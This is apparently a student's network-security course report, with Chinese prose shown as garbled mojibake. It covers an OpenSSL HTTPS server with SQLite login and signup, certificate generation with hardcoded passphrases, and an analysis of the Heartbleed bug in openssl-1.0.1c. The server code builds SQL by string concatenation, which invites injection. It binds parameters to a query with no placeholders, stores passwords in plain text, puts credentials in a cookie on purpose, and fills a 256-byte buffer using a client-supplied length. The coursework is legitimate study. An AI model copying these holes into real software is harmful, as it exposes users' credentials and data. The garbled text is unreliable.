[toc]

# è®¡ç®—æœºç½‘ç»œå®‰å…¨å¤§ä½œä¸šæŠ€æœ¯æŠ¥å‘Š

>   14ç»„-20373914-å´æ–‡éŸ¬
>
>   ä»»åŠ¡åˆ†é…ï¼šè´Ÿè´£å®Œæˆopenssl webæœåŠ¡å™¨åç«¯ä»»åŠ¡ï¼Œä»¥åŠheartbleedå¿ƒè·³æ¼æ´æ”»å‡»è„šæœ¬`poc.py`ç¼–å†™

## webæœåŠ¡å™¨åç«¯ç¼–å†™

>   ä»¥ä¸‹é˜è¿°webæœåŠ¡å™¨åç«¯å®ç°çš„å…·ä½“æ€è·¯å’Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­é‡åˆ°çš„ä¸€äº›æŠ€æœ¯éš¾ç‚¹

### SSLæ¡æ‰‹

>   -   å•†å®šåŒæ–¹é€šä¿¡æ‰€ä½¿ç”¨çš„çš„ TLS ç‰ˆæœ¬ (ä¾‹å¦‚ TLS1.0, 1.2, 1.3ç­‰ç­‰)ï¼›
>   -   ç¡®å®šåŒæ–¹æ‰€è¦ä½¿ç”¨çš„å¯†ç ç»„åˆï¼›
>   -   å®¢æˆ·ç«¯é€šè¿‡æœåŠ¡å™¨çš„å…¬é’¥å’Œæ•°å­—è¯ä¹¦ (ä¸Šç¯‡æ–‡ç« å·²æœ‰ä»‹ç»)ä¸Šçš„æ•°å­—ç­¾åéªŒè¯æœåŠ¡ç«¯çš„èº«ä»½ï¼›
>   -   ç”Ÿæˆä¼šè¯å¯†é’¥ï¼Œè¯¥å¯†é’¥å°†ç”¨äºæ¡æ‰‹ç»“æŸåçš„å¯¹ç§°åŠ å¯†
>
>   <img src="/Users/wwt13/Documents/Notes/assets/bVbCCMD-7895687.png" alt="SSL : TLS æ¡æ‰‹è¿‡ç¨‹" style="zoom:50%;" />

å…¶ä¸­WebServerå®éªŒçš„TLSç‰ˆæœ¬éœ€è¦é€‰å–TLSv1.2ï¼Œå› ä¸ºä»åœ¨åšå®éªŒçš„è¿‡ç¨‹ä¸­å‘ç°ï¼ŒTLSv1.3å¼€å§‹æ›´æ”¹äº†è¯·æ±‚å‘é€çš„ç»“æ„ï¼Œä¹Ÿå°±æ˜¯è¯´Wiresharkæ— æ³•ç›´æ¥åœ¨æ•°æ®æµä¸­è¯†åˆ«å¾—åˆ°å‘é€certificateçš„ç›¸å…³æŠ¥æ–‡ï¼Œä¸åˆ©äºæˆ‘ä»¬å¯¹TLSåè®®è¿›è¡Œç ”ç©¶ã€‚

ä½¿ç”¨ TLS 1.2 éœ€è¦ä¸¤æ¬¡å¾€è¿”ï¼ˆ 2-RTT ï¼‰æ‰èƒ½å®Œæˆæ¡æ‰‹ï¼Œç„¶åæ‰èƒ½å‘é€è¯·æ±‚ã€‚TLS 1.3 çš„æ¡æ‰‹ä¸å†æ”¯æŒé™æ€çš„ RSA å¯†é’¥äº¤æ¢ï¼Œè¿™æ„å‘³ç€å¿…é¡»ä½¿ç”¨å¸¦æœ‰å‰å‘å®‰å…¨çš„ Diffie-Hellman è¿›è¡Œå…¨é¢æ¡æ‰‹ã€‚ä½¿ç”¨ TLS 1.3 åè®®åªéœ€è¦ä¸€æ¬¡å¾€è¿”ï¼ˆ 1-RTT ï¼‰å°±å¯ä»¥å®Œæˆæ¡æ‰‹ã€‚å¦‚ä¸‹å›¾æ‰€ç¤º

![TLS1.3æ¡æ‰‹](/Users/wwt13/Documents/Notes/assets/3021099-20230508224912889-126630221.png)

å…·ä½“ç›¸å…³ä»£ç å®ç°è§æäº¤çš„`HttpProtocol.cpp`ç¨‹åºæ–‡ä»¶

### å¯†é’¥ç”Ÿæˆ

>   é€šè¿‡keygen.shå®ç°äº†ä¸€é”®æœåŠ¡ç«¯ã€å®¢æˆ·ç«¯ç§é’¥ã€è¯ä¹¦ã€CAè¯ä¹¦ã€CAè‡ªç­¾ç”Ÿæˆ

```shell
# CAè¯ä¹¦åŠå¯†é’¥ç”Ÿæˆ----åˆ†æ­¥ç”ŸæˆCAå¯†é’¥åŠå…¶è‡ªç­¾åè¯ä¹¦ï¼š
# ç”Ÿæˆcaç§é’¥
openssl genrsa -aes256 -passout pass:123456 -out ca_rsa_private.pem 2048
# ç”Ÿæˆcaè‡ªç­¾åè¯ä¹¦
openssl req -new -x509 -days 365 -key ca_rsa_private.pem -passin pass:123456 -out ca.crt -subj "/C=CN/ST=GD/L=SZ/O=COM/OU=NSP/CN=CA/emailAddress=youremail@qq.com"

# æœåŠ¡å™¨è¯ä¹¦åŠå¯†é’¥ç”Ÿæˆ----åˆ†æ­¥ç”ŸæˆæœåŠ¡å™¨å¯†é’¥åŠå¾…ç­¾åè¯ä¹¦
# ç”ŸæˆæœåŠ¡å™¨ç§é’¥
openssl genrsa -aes256 -passout pass:server -out server_rsa_private.pem 2048
# ç”ŸæˆæœåŠ¡å™¨å¾…ç­¾åè¯ä¹¦
openssl req -new -key server_rsa_private.pem -passin pass:server -out server.csr -subj "/C=CN/ST=GD/L=SZ/O=COM/OU=NSP/CN=SERVER/emailAddress=youremail@qq.com"
# ä½¿ç”¨CAè¯ä¹¦åŠå¯†é’¥å¯¹æœåŠ¡å™¨è¯ä¹¦è¿›è¡Œç­¾åï¼š
openssl x509 -req -days 365 -in server.csr -CA ca.crt -CAkey ca_rsa_private.pem -passin pass:123456 -CAcreateserial -out server.crt
# å°†åŠ å¯†çš„RSAå¯†é’¥è½¬æˆæœªåŠ å¯†çš„RSAå¯†é’¥ï¼Œé¿å…æ¯æ¬¡è¯»å–éƒ½è¦æ±‚è¾“å…¥è§£å¯†å¯†ç 
# å¯†ç å°±æ˜¯ç”Ÿæˆç§é’¥æ–‡ä»¶æ—¶è®¾ç½®çš„passoutã€è¯»å–ç§é’¥æ–‡ä»¶æ—¶è¦è¾“å…¥çš„passinï¼Œæ¯”å¦‚è¿™é‡Œè¦è¾“å…¥â€œserverâ€
# openssl rsa -in server_rsa_private.pem -out server_rsa_private.pem.unsecure

# å®¢æˆ·ç«¯è¯ä¹¦åŠå¯†é’¥ç”Ÿæˆ----åˆ†æ­¥ç”Ÿæˆå®¢æˆ·ç«¯å¯†é’¥åŠå¾…ç­¾åè¯ä¹¦ï¼š
openssl genrsa -aes256 -passout pass:client -out client_rsa_private.pem 2048
openssl req -new -key client_rsa_private.pem -passin pass:client -out client.csr -subj "/C=CN/ST=GD/L=SZ/O=COM/OU=NSP/CN=CLIENT/emailAddress=youremail@qq.com"
# ä½¿ç”¨CAè¯ä¹¦åŠå¯†é’¥å¯¹å®¢æˆ·ç«¯è¯ä¹¦è¿›è¡Œç­¾åï¼š
openssl x509 -req -days 365 -in client.csr -CA ca.crt -CAkey ca_rsa_private.pem -passin pass:123456 -CAcreateserial -out client.crt
# å°†åŠ å¯†çš„RSAå¯†é’¥è½¬æˆæœªåŠ å¯†çš„RSAå¯†é’¥ï¼Œé¿å…æ¯æ¬¡è¯»å–éƒ½è¦æ±‚è¾“å…¥è§£å¯†å¯†ç 
# å¯†ç å°±æ˜¯ç”Ÿæˆç§é’¥æ–‡ä»¶æ—¶è®¾ç½®çš„passoutã€è¯»å–ç§é’¥æ–‡ä»¶æ—¶è¦è¾“å…¥çš„passinï¼Œæ¯”å¦‚è¿™é‡Œè¦è¾“å…¥â€œclientâ€
# openssl rsa -in client_rsa_private.pem -out client_rsa_private.pem.unsecure
```

å…¶ä¸­ï¼Œæ¯æ¬¡å®¢æˆ·ç«¯æœåŠ¡ç«¯å»ºç«‹è¿æ¥è¯»å–è¯ä¹¦æ—¶éœ€è¦è¾“å…¥å¯†ç çš„é—®é¢˜ï¼Œå·²é€šè¿‡å®ç°`password_db`å‡½æ•°è¿›è¡Œè§£å†³

```c++
int password_cb(char *buf, int num, int rwflag, void *userdata)
{
    char *pass = PASSWORD;
    if ((unsigned int)num < strlen(pass) + 1)
    {
        return (0);
    }

    strcpy(buf, pass);
    return (strlen(pass));
}
```

###  makefileç¼–è¯‘

>   è¿™ç®—æ˜¯æœ¬æ¬¡SSLå®éªŒçš„è¾ƒéš¾ç‚¹ä¹‹ä¸€ï¼Œå› ä¸ºç¯å¢ƒé™åˆ¶ä¸å¯èƒ½ç›´æ¥åœ¨è™šæ‹Ÿæœºä¸Šè¿›è¡Œä»£ç ç¼–å†™ï¼Œè¿˜æ˜¯å¾—åœ¨è‡ªå·±çš„macç”µè„‘ä¸Šå…ˆæŠŠä»£ç å†™å¥½åœ¨é€šè¿‡gitæœåŠ¡å™¨å°†è™šæ‹Ÿæœºä¸Šçš„ä»£ç æ›´æ–°ï¼Œè¿™å°±æ¶‰åŠåˆ°äº†ç¼–è¯‘ç¯å¢ƒçš„åˆ‡æ¢é—®é¢˜ï¼Œå…·ä½“å®ç°æ€è·¯å¦‚ä¸‹
>
>   å…¶ä¸­`mac`/`normal`/`heartbleed`ï¼Œåˆ†åˆ«ä¸ºæœ¬æœºç¼–è¯‘ç¯å¢ƒï¼Œè™šæ‹ŸæœºWebServerç¼–è¯‘ç¯å¢ƒï¼Œheartbleedå®éªŒæ‰€éœ€çš„å¸¦ç¼ºé™·çš„openssl-1.0.1cç¼–è¯‘ç¯å¢ƒ
>
>   å½“å‰å®ç°çš„æ•ˆæœï¼Œåªéœ€make+æ‰€éœ€ç¯å¢ƒå‰ç¼€å³å¯å®ç°ä¸€é”®ç¼–è¯‘ç¯å¢ƒåˆ‡æ¢

```makefile
# Generated automatically from Makefile.in by configure.
CC = g++

OPENSSL_INCLUDE_MAC = /opt/homebrew/opt/openssl@1.1/include
OPENSSL_LIB_MAC = /opt/homebrew/opt/openssl@1.1/lib
# OPENSSL_MAC = /opt/homebrew/opt/openssl@1.1/bin/openssl
OPENSSL_INCLUDE_LINUX_NORMAL = /usr/local/openssl-1.1.1f/include
OPENSSL_LIB_LINUX_NORMAL = /usr/local/openssl-1.1.1f/lib
# OPENSSL_LINUX_NORMAL = /usr/local/openssl-1.1.1f/bin/openssl
OPENSSL_INCLUDE_LINUX_HEARTBLEED = /usr/local/openssl-1.0.1c/include
OPENSSL_LIB_LINUX_HEARTBLEED = /usr/local/openssl-1.0.1c/lib
# OPENSSL_LINUX_HEARTBLEED = /usr/local/openssl-1.0.1c/bin/openssl

CFLAGS=-g -I$(OPENSSL_INCLUDE) -Wall
LD=-L$(OPENSSL_LIB) -lssl -lcrypto -ldl -lpthread -lsqlite3

.PHONY: clean Key server client

common.o: common.cpp common.h
	$(CC) $(CFLAGS) -c common.cpp

HttpProtocol.o: HttpProtocol.cpp HttpProtocol.h
	$(CC) $(CFLAGS) -std=c++11 -c HttpProtocol.cpp

server.o: server.cpp
	$(CC) $(CFLAGS) -c server.cpp

server: common.o server.o HttpProtocol.o
	$(CC) $(CFLAGS) common.o server.o HttpProtocol.o -o server $(LD)

client: client.cpp
	$(CC) $(CFLAGS) -std=c++11 client.cpp -o client $(LD)

mac:
	OPENSSL_INCLUDE=$(OPENSSL_INCLUDE_MAC) OPENSSL_LIB=$(OPENSSL_LIB_MAC) $(MAKE) Key server client

normal:
	OPENSSL_INCLUDE=$(OPENSSL_INCLUDE_LINUX_NORMAL) OPENSSL_LIB=$(OPENSSL_LIB_LINUX_NORMAL) $(MAKE) Key server client

heartbleed:
	OPENSSL_INCLUDE=$(OPENSSL_INCLUDE_LINUX_HEARTBLEED) OPENSSL_LIB=$(OPENSSL_LIB_LINUX_HEARTBLEED) $(MAKE) Key server client

Key:
	chmod +x keygen.sh
	./keygen.sh

clean:
	rm -rf client.dSYM
	rm -f *.o server client
	rm -f *.crt *.key *.pem *.csr *.srl
```

### è¯·æ±‚å¤„ç†

>   å…¶ä¸­`HEAD`ã€`GET`ã€`DELETE`è¯·æ±‚é‡åˆåº¦è¾ƒé«˜ï¼Œå¹¶ä¸”`GET`è¯·æ±‚åœ¨ç»™å‡ºçš„ä»£ç æ¨¡æ¿ä¸­å·²ç»æ›¿æˆ‘ä»¬å®ç°å¥½äº†ï¼Œå…·ä½“è®²è®²`POST`è¯·æ±‚çš„å¤„ç†å®ç°æµç¨‹ã€‚

POSTè¯·æ±‚å…·ä½“ç»“æ„å¦‚ä¸‹ï¼Œå…¶ä¸­è¯·æ±‚å¤´å’Œè¯·æ±‚ä½“ä½¿ç”¨`\r\n`åˆ†éš”å¼€ï¼Œè¯¥è¯·æ±‚ä½“æ ¼å¼å¸¸ç”¨äºHTMLè¡¨å•æäº¤ï¼Œç”¨äºå‘webæœåŠ¡å™¨æäº¤ç™»å½•æ³¨å†Œç›¸å…³æ•°æ®ï¼ˆä¸ºä»€ä¹ˆå®ç°è¿™ç§å½¢å¼çš„POSTè¯·æ±‚å‘¢ï¼Œå› ä¸ºä¾¿äºåœ¨æµè§ˆå™¨ä¸­è¿›è¡Œæ¼”ç¤ºï¼Œå®ç°ä¸€ä¸ªç™»å½•æ³¨å†Œé¡µé¢å³å¯ï¼Œè€Œä¸”ä¹Ÿä¾¿äºåç»­çš„heartbleedæ¼æ´å®éªŒæ¼”ç¤ºçªƒå–ç™»å½•ç”¨æˆ·å­˜åœ¨cookieä¸­çš„è´¦å·å¯†ç ï¼‰
```http
POST /api/v1/resource HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Authorization: Bearer your-token-here
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Content-Length: 85

email=123132&password=12313132
```

è¯·æ±‚å¤´åˆ†æå…·ä½“å®ç°å¦‚ä¸‹ï¼Œéœ€è¦æ³¨æ„çš„ä¸€ç‚¹å°±æ˜¯POSTè¯·æ±‚éœ€è¦æå‰è·å–åˆ°å…·ä½“çš„`Content-Length`ï¼Œç”¨äºåç»­å¯¹è¯·æ±‚ä½“çš„è¯»å–ã€‚

```c++
int CHttpProtocol::Analyze(PREQUEST pReq, LPBYTE pBuf)
{
	char szSeps[] = " \n"; // ç”¨äºåˆ†å‰²çš„å­—ç¬¦ä¸²ï¼ŒåŒ…æ‹¬ç©ºæ ¼å’Œæ¢è¡Œç¬¦(æ˜¯æœ‰ç©ºæ ¼å°±åˆ†å‰²ï¼Œæœ‰æ¢è¡Œç¬¦å°±åˆ†å‰²)
	char *cpToken;		   // ç”¨äºå­˜æ”¾åˆ†å‰²åçš„å­—ç¬¦ä¸²
	// ..æ˜¯è¯·æ±‚è®¿é—®çˆ¶çº§ç›®å½•ï¼Œè¿™æ˜¯å®‰å…¨é£é™©ï¼Œç›´æ¥è¿”å›400 Bad Requestï¼Œæ‹’ç»è¯·æ±‚
	if (strstr((const char *)pBuf, "..") != NULL)
	{
		strcpy(pReq->StatuCodeReason, HTTP_STATUS_BADREQUEST);
		return 1;
	}
	cpToken = strtok((char *)pBuf, szSeps); // å°†è·å–åˆ°çš„è¯·æ±‚å¤´åˆ†å‰²æˆä¸€ä¸ªä¸ªå­—ç¬¦ä¸²ï¼Œå­˜æ”¾åœ¨cpTokenä¸­ï¼ˆè¿™é‡Œæ˜¯åˆ†å‰²ç¬¬ä¸€æ¬¡ï¼Œä¹Ÿå°±æ˜¯è¯´cpTokenä¸­çš„å†…å®¹æ˜¯GETï¼‰
	......
	else if (!strcmp(cpToken, "POST"))
	{
		pReq->nMethod = METHOD_POST;
	}
	......
	else
	{
		// æœªå®ç°çš„åè®®å†…å®¹
		strcpy(pReq->StatuCodeReason, HTTP_STATUS_NOTIMPLEMENTED);
		return 1;
	}
	// è·å–æ–‡ä»¶è·¯å¾„
	cpToken = strtok(NULL, szSeps);
	if (cpToken == NULL)
	{
		strcpy(pReq->StatuCodeReason, HTTP_STATUS_BADREQUEST);
		return 1;
	}
	// é¦–å…ˆè®¾ç½®æ ¹ç›®å½• /home/WebServer
	strcpy(pReq->szFileName, m_strRootDir);
	if (strlen(cpToken) > 1)
	{
		strcat(pReq->szFileName, cpToken); // æ‹¼æ¥å¾—åˆ°å®Œæ•´æ–‡ä»¶è·¯å¾„
	}
	else
	{
		strcat(pReq->szFileName, "/index.html");
	}
	// æ¥ä¸‹æ¥éœ€è¦è·å–å¾—åˆ°Bodyé•¿åº¦
	while (1)
	{
		cpToken = strtok(NULL, szSeps);
		if (cpToken == NULL)
		{
			break;
		}
		if (!strcmp(cpToken, "Content-Length:"))
		{
			cpToken = strtok(NULL, szSeps);
			pReq->contentLength = atoi(cpToken);
			break;
		}
	}
	return 0;
}
```

è¯·æ±‚ä½“è¯»å–å…·ä½“å®ç°ï¼šéœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ç½‘ç»œåŒ…ä¼šå¯¹@ç­‰ç‰¹æ®Šå­—ç¬¦è¿›è¡Œç¼–ç å¤„ç†ï¼Œéœ€è¦ä½¿ç”¨`urlDecode()`å‡½æ•°è¿›è¡Œç›¸å…³å¤„ç†æ‰èƒ½å¾—åˆ°æ­£ç¡®å†…å®¹

```c++
// è¯»å–è¯·æ±‚body
if (pReq->contentLength > 0)
{
    char temp[256];
    // è¯»å–bodyå†…å®¹
    nRet = BIO_read(io, temp, pReq->contentLength);
    if (nRet <= 0)
    {
        printf("Reading body error!!\r\n");
        pHttpProtocol->Disconnect(pReq);
        delete pReq;
        SSL_free(ssl);
        return NULL;
    }
    temp[pReq->contentLength] = '\0';
    sprintf(pReq->content, "%s", urlDecode(temp).c_str());
    printf("%s\n", pReq->content);
}
```

è¯·æ±‚è¿”å›å“åº”å…·ä½“å®ç°ï¼šå…·ä½“æ­¥éª¤å¦‚ä¸‹ğŸ‘‡ğŸ»

1.   å°†è¯·æ±‚ä½“è§£æä¸ºjsonç±»å‹çš„æ•°æ®ï¼Œé€šè¿‡`strtok`ä¾æ®`&=`å¯¹å…¶è¿›è¡Œåˆ†å‰²ï¼Œå†å­˜å‚¨åœ¨ç¬¬ä¸‰æ–¹åº“`nlohmann::json`å®ç°çš„jsonç»“æ„ä½“ä¸­ï¼Œä½œä¸ºåç»­æ•°æ®åº“éœ€è¦è¿›è¡Œå¤„ç†çš„æ•°æ®
2.   åˆ¤æ–­è¯·æ±‚ç±»å‹ï¼š`signup|login`
3.   æ•°æ®åº“æ“ä½œï¼Œsignupåˆ™å°†ç”¨æˆ·ä¿¡æ¯å†™å…¥æ•°æ®åº“ï¼Œloginåˆ™æ£€é˜…æ•°æ®åº“ä¸­æ˜¯å¦å­˜åœ¨å¯¹åº”ç”¨æˆ·å¹¶æ ¡éªŒå¯†ç æ­£ç¡®æ€§ï¼ˆæ•°æ®åº“é€‰å–çš„æ˜¯ç®€å•è½»ä¾¿çš„sqlite3ï¼‰
4.   è¯·æ±‚è¿”å›ï¼Œæ„é€ Responseå­—ç¬¦ä¸²å¹¶å†™å…¥io

```c++
else if (pReq->nMethod == METHOD_POST)
{
    json postData;
    char *body = pReq->content;
    char szSeps[] = "&=";
    char *cpToken = strtok((char *)body, szSeps);
    while (cpToken != NULL)
    {
        string key = cpToken;
        cpToken = strtok(NULL, szSeps);
        string value = cpToken;
        postData[key] = value;
        cpToken = strtok(NULL, szSeps);
    }
    char *status, *message;
    // è·å–åˆ°äº†æ³¨å†Œæ•°æ®ï¼Œéœ€è¦å°†å…¶å†™å…¥æ•°æ®åº“ä¸­
    if (strstr(pReq->szFileName, "signup") != NULL)
    {
        // Connect to the database
        sqlite3 *db;
        int rc = sqlite3_open("database.db", &db);
        if (rc != SQLITE_OK)
        {
            printf("Cannot open database: %s\n", sqlite3_errmsg(db));
            return false;
        }
        // Create the table if it doesn't exist
        const char *createTableQuery = "CREATE TABLE IF NOT EXISTS postData ("
                                       "name TEXT PRIMARY KEY,"
                                       "email TEXT,"
                                       "password TEXT);";
        rc = sqlite3_exec(db, createTableQuery, 0, 0, 0);
        if (rc != SQLITE_OK)
        {
            printf("Cannot create table: %s\n", sqlite3_errmsg(db));
            sqlite3_close(db);
            return false;
        }
        // Insert the post data into the table
        json::iterator it;
        string key[3];
        string value[3];
        int i;
        for (i = 0, it = postData.begin(); it != postData.end(); ++it, i++)
        {
            key[i] = it.key();
            value[i] = it.value();
        }
        string insertQuery = "INSERT INTO postData ('" + key[0] + "', '" + key[1] + "', '" + key[2] + "') VALUES ('" + value[0] + "', '" + value[1] + "', '" + value[2] + "');";
        rc = sqlite3_exec(db, insertQuery.c_str(), 0, 0, 0);
        switch (rc)
        {
        case SQLITE_OK:
            status = "success";
            message = "User registered successfully";
            break;
        case SQLITE_CONSTRAINT:
            status = "success";
            message = "User already exists";
            break;
        default:
            STATUS = HTTP_STATUS_NOTFOUND;
            status = "error";
            message = "Internal server error";
            break;
        }
        // Close the database connection
        sqlite3_close(db);
    }
    // è·å–åˆ°äº†ç™»å½•æ•°æ®ï¼Œéœ€è¦éªŒè¯ç™»å½•
    else if (strstr(pReq->szFileName, "login") != NULL)
    {
        printf("try to login\n");
        // Connect to the database
        sqlite3 *db;
        int rc = sqlite3_open("database.db", &db);
        if (rc != SQLITE_OK)
        {
            printf("Cannot open database: %s\n", sqlite3_errmsg(db));
            return false;
        }
        json::iterator it;
        string key[2];
        string value[2];
        int i;
        for (i = 0, it = postData.begin(); it != postData.end(); ++it, i++)
        {
            key[i] = it.key();
            value[i] = it.value();
        }
        sqlite3_stmt *stmt;
        string selectQuery = "SELECT * FROM postData WHERE email='" + value[0] + "' AND password='" + value[1] + "';";
        // å‡†å¤‡SQLè¯­å¥
        if (sqlite3_prepare_v2(db, selectQuery.c_str(), -1, &stmt, 0) != SQLITE_OK)
        {
            printf("Cannot prepare statement: %s\n", sqlite3_errmsg(db));
            return false;
        }
        // ç»‘å®šå‚æ•°
        sqlite3_bind_text(stmt, 1, value[0].c_str(), -1, SQLITE_STATIC);
        sqlite3_bind_text(stmt, 2, value[1].c_str(), -1, SQLITE_STATIC);
        // æ‰§è¡Œå¹¶è·å–ç¬¬ä¸€æ¡è®°å½•
        rc = sqlite3_step(stmt);
        // æŸ¥è¯¢åˆ°è‡³å°‘ä¸€æ¡è®°å½•
        if (rc == SQLITE_ROW)
        {
            status = "success";
            message = "User logged in successfully";
        }
        // æœªè¿”å›ä»»ä½•è®°å½•
        else if (rc == SQLITE_DONE)
        {
            STATUS = HTTP_STATUS_NOTFOUND;
            status = "error";
            message = "User does not exist";
        }
        else
        {
            status = "error";
            message = "Internal server error";
            printf("Cannot execute statement: %s\n", sqlite3_errmsg(db));
        }
        sqlite3_finalize(stmt);
        // Close the database connection
        sqlite3_close(db);
    }
    printf("PostData: %s\n", postData.dump().c_str());
    // POSTè¯·æ±‚
    char ContentType[50] = "application/json";
    long length = 0;
    json res;
    res["status"] = status;
    res["message"] = message;
    string json_string = res.dump();
    length = json_string.length();
    sprintf((char *)Header, "HTTP/1.1 %s\r\nDate: %s\r\nServer: %s\r\nContent-Type: %s\r\nContent-Length: %d\r\nAccess-Control-Allow-Origin: *\r\nSet-Cookie: postData=%s\r\n\r\n",
            STATUS,
            curTime,						// Date
            "Villa Server 192.168.176.139", // Server"My Https Server"
            ContentType,					// Content-Type
            length,							// Content-length
            postData.dump().c_str());		// Set-Cookie value

    if (BIO_write(io, Header, strlen(Header)) <= 0)
    {
        return false;
    }
    BIO_flush(io); // Only to ensure all IO operations are completed
    printf("SSLSendHeader successfully!\n");
    // Send the JSON response
    if (BIO_write(io, json_string.c_str(), length) <= 0)
    {
        return false;
    }
    BIO_flush(io);
}
```

## heartbleedå¿ƒè·³æ¼æ´åˆ©ç”¨

### æ¼æ´ç¯å¢ƒæ­å»º

>   Ubuntu18.04,openssl-1.0.1c,å‰é¢å®éªŒå®ç°çš„webserver

é€šè¿‡config.shå®ç°ä¸€é”®å®éªŒç¯å¢ƒæ­å»º

```sh
sudo apt install sqlite3
sudo apt install libsqlite3-dev # for sqlite3.h(å¼€æ”¾ç»™é«˜çº§è¯­è¨€çš„æ¥å£)
sudo apt install tmux
cd ~
wget http://www.openssl.org/source/openssl-1.0.1c.tar.gz
tar -zxvf openssl-1.0.1c.tar.gz
cd openssl-1.0.1c
./config  --prefix=/usr/local/openssl-1.0.1c --openssldir=/usr/local/openssl-1.0.1c/ssl
make
sudo make install
cd ~
wget https://www.openssl.org/source/openssl-1.1.1f.tar.gz
tar -zxvf openssl-1.1.1f.tar.gz
cd openssl-1.1.1f
./config  --prefix=/usr/local/openssl-1.1.1f --openssldir=/usr/local/openssl-1.1.1f/ssl
make
sudo make install
```

é‡åˆ°çš„ä¸€ä¸ªå°é—®é¢˜â˜ğŸ»ï¼Œç›´æ¥åˆå§‹åŒ–çš„ubuntè™šæ‹Ÿæœºæ— æ³•è¿æ¥githubï¼Œéœ€è¦é…ç½®ç›¸å…³http/https/sock5ä»£ç†æ‰å¯è¿›è¡Œè”ç½‘

### heartbleedæ¼æ´åˆ†æè®¾è®¡

>   æºä»£ç é“¾æ¥åœ°å€ï¼šhttps://github.com/openssl/openssl/tree/OpenSSL_1_0_1c

æŸ¥çœ‹ssl/dl_both.cï¼Œæ¼æ´çš„è¡¥ä¸ä»è¿™è¡Œè¯­å¥å¼€å§‹ï¼š

```c++
int            
dtls1_process_heartbeat(SSL *s)
    {          
    unsigned char *p = &s->s3->rrec.data[0], *pl;
    unsigned short hbtype;
    unsigned int payload;
    unsigned int padding = 16; /* Use minimum padding */
```

ä¸€ä¸Šæ¥å°±æ‹¿åˆ°äº†ä¸€ä¸ªæŒ‡å‘ä¸€æ¡SSLv3è®°å½•ä¸­æ•°æ®çš„æŒ‡é’ˆã€‚ç»“æ„ä½“SSL3_RECORDçš„å®šä¹‰å¦‚ä¸‹ï¼ˆç»“æ„ä½“SSL3_RECORDä¸æ˜¯SSLv3è®°å½•çš„å®é™…å­˜å‚¨æ ¼å¼ã€‚ä¸€æ¡SSLv3è®°å½•æ‰€éµå¾ªçš„å­˜å‚¨æ ¼å¼è¯·å‚è§ä¸‹æ–‡åˆ†æï¼‰

```c++
typedef struct ssl3_record_st
    {
        int type;               /* type of record */
        unsigned int length;    /* How many bytes available */
        unsigned int off;       /* read/write offset into 'buf' */
        unsigned char *data;    /* pointer to the record data */
        unsigned char *input;   /* where the decode bytes are */
        unsigned char *comp;    /* only used with decompression - malloc()ed */
        unsigned long epoch;    /* epoch number, needed by DTLS1 */
        unsigned char seq_num[8]; /* sequence number, needed by DTLS1 */

    } SSL3_RECORD;
```

â€ƒæ¯æ¡SSLv3è®°å½•ä¸­åŒ…å«ä¸€ä¸ªç±»å‹åŸŸï¼ˆtypeï¼‰ã€ä¸€ä¸ªé•¿åº¦åŸŸï¼ˆlengthï¼‰å’Œä¸€ä¸ªæŒ‡å‘è®°å½•æ•°æ®çš„æŒ‡é’ˆï¼ˆdataï¼‰ã€‚æˆ‘ä»¬å›å¤´å»çœ‹dtls1_process_heartbeatï¼š

```c++
/* Read type and payload length first */
hbtype = *p++;
n2s(p, payload);
pl = p;
```

â€ƒSSLv3è®°å½•çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ ‡æ˜äº†å¿ƒè·³åŒ…çš„ç±»å‹ã€‚å®n2sä»æŒ‡é’ˆpæŒ‡å‘çš„æ•°ç»„ä¸­å–å‡ºå‰ä¸¤ä¸ªå­—èŠ‚ï¼Œå¹¶æŠŠå®ƒä»¬å­˜å…¥å˜é‡payloadä¸­â€”â€”è¿™å®é™…ä¸Šæ˜¯å¿ƒè·³åŒ…è½½è·çš„é•¿åº¦åŸŸï¼ˆlengthï¼‰ã€‚æ³¨æ„ç¨‹åºå¹¶æ²¡æœ‰æ£€æŸ¥è¿™æ¡SSLv3è®°å½•çš„å®é™…é•¿åº¦ã€‚å˜é‡plåˆ™æŒ‡å‘ç”±è®¿é—®è€…æä¾›çš„å¿ƒè·³åŒ…æ•°æ®ã€‚

è¿™ä¸ªå‡½æ•°çš„åé¢è¿›è¡Œäº†ä»¥ä¸‹å·¥ä½œï¼š

```c++
unsigned char *buffer, *bp;
int r;
/* Allocate memory for the response, size is 1 byte
 * message type, plus 2 bytes payload length, plus
 * payload, plus padding
 */
buffer = OPENSSL_malloc(1 + 2 + payload + padding);

bp = buffer;
```

â€ƒæ‰€ä»¥ç¨‹åºå°†åˆ†é…ä¸€æ®µç”±è®¿é—®è€…æŒ‡å®šå¤§å°çš„å†…å­˜åŒºåŸŸï¼Œè¿™æ®µå†…å­˜åŒºåŸŸæœ€å¤§ä¸º (65535 + 1 + 2 + 16) ä¸ªå­—èŠ‚ã€‚å˜é‡bpæ˜¯ç”¨æ¥è®¿é—®è¿™æ®µå†…å­˜åŒºåŸŸçš„æŒ‡é’ˆã€‚

```c++
/* Enter response type, length and copy payload */
*bp++ = TLS1_HB_RESPONSE;
s2n(payload, bp);

memcpy(bp, pl, payload); &emsp;&emsp;å®s2nä¸å®n2så¹²çš„äº‹æƒ…æ­£å¥½ç›¸åï¼šs2nè¯»å…¥ä¸€ä¸ª16 bité•¿çš„å€¼ï¼Œç„¶åå°†å®ƒå­˜æˆåŒå­—èŠ‚å€¼ï¼Œæ‰€ä»¥s2nä¼šå°†ä¸è¯·æ±‚çš„å¿ƒè·³åŒ…è½½è·é•¿åº¦ç›¸åŒçš„é•¿åº¦å€¼å­˜å…¥å˜é‡payloadã€‚ç„¶åç¨‹åºä»plå¤„å¼€å§‹å¤åˆ¶payloadä¸ªå­—èŠ‚åˆ°æ–°åˆ†é…çš„bpæ•°ç»„ä¸­â€”â€”plæŒ‡å‘äº†ç”¨æˆ·æä¾›çš„å¿ƒè·³åŒ…æ•°æ®ã€‚æœ€åï¼Œç¨‹åºå°†æ‰€æœ‰æ•°æ®å‘å›ç»™ç”¨æˆ·ã€‚
```

